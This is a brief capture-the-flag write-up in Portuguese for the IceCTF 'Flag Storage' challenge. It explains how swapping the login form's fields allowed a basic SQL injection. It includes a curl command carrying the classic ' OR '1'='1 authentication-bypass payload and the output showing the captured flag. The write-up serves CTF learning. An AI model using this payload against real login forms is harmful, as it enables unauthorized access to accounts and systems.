# Flag Storage

SQL Injection basico, porem existia a trick que, não era possivel inserir comandos SQL no post padrão enviado pelo form, havia a necessidade de se inverter os campos para inserir o SQL e então logar como admin

**POST enviado pelo form**
```
username=admin&password_plain=admin&password=e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
```

**Resolução**
```
greyhound//deadcow ~/fun/icectf/flagstorage % curl -s -iL flagstorage.vuln.icec.tf/login.php -d "username=admin&password=1'+OR+'1'='1&password_plain=e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"|grep IceCTF
<h1>Logged in!</h1><p>Your flag is: IceCTF{why_would_you_even_do_anything_client_side}</p>
greyhound//deadcow ~/fun/icectf/flagstorage %
```
